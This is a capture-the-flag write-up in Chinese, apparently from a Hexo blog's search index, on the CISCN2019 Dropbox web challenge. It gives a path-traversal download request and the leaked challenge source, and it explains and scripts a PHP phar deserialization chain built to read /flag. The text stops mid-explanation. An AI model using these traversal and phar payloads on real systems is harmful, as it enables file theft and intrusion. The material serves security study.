<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CISCN2019 华北赛区 Day1  Web1 Dropbox</title>
    <url>/2022/05/04/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</url>
    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>注册后进入网站，上传文件后，用Burp Suite拦截请求，修改请求，任意文件可下载。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/download.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>3a15d220-2508-43a9-a971-ff055bdaf52f.node4.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=71e4c77c7af3596b74ed78af4c02a0ff</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">filename</span><span class="operator">=</span>../../index.php</span></span><br></pre></td></tr></table></figure>

<p>响应中得到 <code>index.php</code> 源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据 <code>index.php</code> 中的提示，说明还有 <code>class.php</code>，读取 <code>class.php</code> 源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>); <span class="comment">//返回我们上传文件的所有文件名</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>); <span class="comment">// 把File对象加入到files数组</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>(); <span class="comment">// results 是个数组，保存以我们上传的文件名作为键值，每个文件名键值映射一个数组。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123; <span class="comment">// 每次把每个一级数组的值，传递给$result,即filename1[]</span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">继续读取 `download.php`</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>根据题意所得，题目猜测的是反序列化。</p>
<h3 id="寻找反序列化的魔术函数"><a href="#寻找反序列化的魔术函数" class="headerlink" title="寻找反序列化的魔术函数"></a>寻找反序列化的魔术函数</h3><p><code>class.php</code> 中涉及到反序列化的魔术方法为 <code>User-&gt;__destruct()</code>,调用 <code>$this-&gt;db-&gt;close()</code> 函数，其中 <code>$this-&gt;db</code> 可控。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    .......</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="寻找存在-close-函数的类"><a href="#寻找存在-close-函数的类" class="headerlink" title="寻找存在 close() 函数的类"></a>寻找存在 <code>close()</code> 函数的类</h3><p>发现 <code>File</code> 类中存在  <code>close()</code> 函数。可上传文件，通过 <code>file_get_contents($this-&gt;filename)</code> 函数读取文件，所以可以明确是涉及 <code>phar://</code> 协议反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，基本的反序列化利用链已经出现了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>But，无法回显被读取文件的内容。 </p>
<h3 id="利用-FileList-类"><a href="#利用-FileList-类" class="headerlink" title="利用 FileList 类"></a>利用 FileList 类</h3><p><code>FileList</code> 类没有 <code>close()</code> 函数, But 有 <code>__call()</code>。假如将 <code>$this-&gt;db</code> 设置为 <code>FileList</code> 类，则 <code>$this-&gt;db-&gt;close() = FileList-&gt;close()</code>，将触发 <code>__call</code> ，代码如下所示。其中 <code>$file-&gt;$func()</code> 中的 <code>$file</code> 来源于 <code>$this-&gt;files</code> ，可令 <code>$this-&gt;files = array(new File())</code>，则  <code>$file-&gt;$func()</code> 将执行 <code>File-&gt;close()</code>。同时将执行结果赋值到 <code>results</code> 数组。而 <code>results</code> 数组将会通过 <code>FileList-&gt;__destruct()</code> 展示在返回给访客的页面中，即可以返回指定文件的读取结果给攻击者。</p>
